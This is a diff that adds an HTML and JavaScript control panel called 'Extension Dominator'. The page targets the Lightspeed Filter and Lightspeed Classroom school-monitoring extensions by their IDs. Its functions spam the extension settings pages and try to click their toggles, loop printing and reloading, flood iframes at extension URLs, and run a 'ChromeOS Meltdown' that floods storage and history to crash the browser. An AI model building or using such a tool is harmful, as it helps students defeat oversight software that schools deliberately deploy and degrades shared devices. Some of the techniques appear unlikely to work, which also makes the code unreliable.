@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Extension Dominator</title>
+    <style>
+        :root {
+            --primary: #007bff;
+            --danger: #dc3545;
+            --nuclear: #ff0000;
+            --background: #1a1d22;
+            --panel: #26292e;
+        }
+
+        * {
+            font-family: 'Roboto', sans-serif;
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: var(--background);
+            color: #fff;
+            display: flex;
+            min-height: 100vh;
+        }
+
+        .side-panel {
+            width: 250px;
+            height: 100vh;
+            background: var(--panel);
+            padding: 20px;
+            position: fixed;
+            border-right: 2px solid #444;
+        }
+
+        .nav-item {
+            padding: 15px;
+            margin: 10px 0;
+            cursor: pointer;
+            border-radius: 8px;
+            transition: background 0.3s;
+        }
+
+        .nav-item:hover {
+            background: #373b3e;
+        }
+
+        .main-content {
+            flex: 1;
+            padding: 30px;
+            margin-left: 250px;
+        }
+
+        .control-panel {
+            background: #222529;
+            padding: 20px;
+            border-radius: 12px;
+            margin-bottom: 20px;
+        }
+
+        .target-select {
+            width: 100%;
+            padding: 12px;
+            margin: 15px 0;
+            background: #292a2d;
+            border: 1px solid #444;
+            color: #fff;
+            border-radius: 8px;
+        }
+
+        .button-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            margin-top: 20px;
+        }
+
+        .action-btn {
+            padding: 15px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+
+        .primary { background: var(--primary); }
+        .danger { background: var(--danger); }
+        .nuclear {
+            background: var(--nuclear);
+            animation: pulse 1s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+
+        .status-panel {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: var(--panel);
+            padding: 15px;
+            border-radius: 8px;
+        }
+    </style>
+</head>
+<body>
+    <div class="side-panel">
+        <h2>Extension Dominator</h2>
+        <div class="nav-item active" data-section="main">Main Controls</div>
+        <div class="nav-item" data-section="advanced">Nuclear Options</div>
+    </div>
+
+    <div class="main-content">
+        <div class="control-panel" id="main">
+            <select class="target-select" id="targetSelect">
+                <option value="filter">Lightspeed Filter</option>
+                <option value="classroom">Lightspeed Classroom</option>
+                <option value="all">All Extensions</option>
+            </select>
+
+            <div class="button-grid">
+                <button class="action-btn primary" onclick="toggleExtensionSettings()">
+                    Toggle Settings Spam
+                </button>
+                <button class="action-btn primary" onclick="startPrintReload()">
+                    Start Print/Reload
+                </button>
+                <button class="action-btn danger" onclick="disableExtensions()">
+                    Disable Extensions
+                </button>
+            </div>
+        </div>
+
+        <div class="control-panel" id="advanced" style="display: none;">
+            <div class="button-grid">
+                <button class="action-btn nuclear" onclick="chromeOSNuclear()">
+                    Initiate ChromeOS Meltdown
+                </button>
+            </div>
+        </div>
+
+        <div class="status-panel">
+            <p>Status: <span id="statusText">Ready</span></p>
+            <p>Active Processes: <span id="processCounter">0</span></p>
+        </div>
+    </div>
+
+    <script>
+        const EXTENSIONS = {
+            filter: 'adkcpkpghahmbopkjchobieckeoaoeem',
+            classroom: 'kkbmdgjggcdajckdlbngdjonpchpaiea'
+        };
+
+        let activeProcesses = new Set();
+        let settingsSpamInterval = null;
+
+        function updateStatus(text) {
+            document.getElementById('statusText').textContent = text;
+        }
+
+        function updateProcessCount() {
+            document.getElementById('processCounter').textContent = activeProcesses.size;
+        }
+
+        function toggleExtensionSettings() {
+            if (!settingsSpamInterval) {
+                startSettingsSpam();
+            } else {
+                stopSettingsSpam();
+            }
+        }
+
+        function startSettingsSpam() {
+            const targets = getSelectedTargets();
+            
+            settingsSpamInterval = setInterval(() => {
+                targets.forEach(id => {
+                    const settingsUrl = `chrome://extensions/?id=${id}`;
+                    const win = window.open(settingsUrl, '_blank');
+                    
+                    if (win) {
+                        try {
+                            setTimeout(() => {
+                                win.document.querySelector('extensions-toolbar').shadowRoot
+                                    .querySelector('cr-toggle').click();
+                            }, 500);
+                        } catch (e) {
+                            console.error('Settings manipulation failed:', e);
+                        }
+                        
+                        setTimeout(() => win.close(), 1000);
+                    }
+                });
+            }, 1500);
+
+            activeProcesses.add(settingsSpamInterval);
+            updateStatus('Settings Spam Active');
+            updateProcessCount();
+        }
+
+        function stopSettingsSpam() {
+            clearInterval(settingsSpamInterval);
+            activeProcesses.delete(settingsSpamInterval);
+            settingsSpamInterval = null;
+            updateStatus('Settings Spam Stopped');
+            updateProcessCount();
+        }
+
+        function startPrintReload() {
+            const cycle = setInterval(() => {
+                window.print();
+                setTimeout(() => location.reload(), 10000);
+            }, 15000);
+            
+            activeProcesses.add(cycle);
+            updateStatus('Print/Reload Active');
+            updateProcessCount();
+        }
+
+        function disableExtensions() {
+            const targets = getSelectedTargets();
+            targets.forEach(id => {
+                const win = window.open('', '_blank');
+                for (let i = 0; i < 100; i++) {
+                    win.document.write(`<iframe src="chrome-extension://${id}/main.js">`);
+                }
+            });
+            updateStatus('Extensions Disabled');
+        }
+
+        function chromeOSNuclear() {
+            // Extreme settings manipulation
+            Object.values(EXTENSIONS).forEach(id => {
+                for (let i = 0; i < 20; i++) {
+                    window.open(`chrome://extensions/?id=${id}`, '_blank');
+                }
+            });
+
+            // Resource flooding
+            const flood = setInterval(() => {
+                localStorage.setItem('crash', Array(1e5).fill(0).join(''));
+                history.pushState({}, '', `?crash=${Math.random()}`);
+            }, 50);
+
+            activeProcesses.add(flood);
+            updateStatus('Nuclear Meltdown Active');
+            updateProcessCount();
+        }
+
+        function getSelectedTargets() {
+            const selection = document.getElementById('targetSelect').value;
+            return selection === 'all' 
+                ? Object.values(EXTENSIONS) 
+                : [EXTENSIONS[selection]];
+        }
+
+        // Navigation controls
+        document.querySelectorAll('.nav-item').forEach(item => {
+            item.addEventListener('click', () => {
+                document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
+                item.classList.add('active');
+                document.querySelectorAll('.control-panel').forEach(panel => {
+                    panel.style.display = 'none';
+                });
+                document.getElementById(item.dataset.section).style.display = 'block';
+            });
+        });
+    </script>
+</body>
+</html>
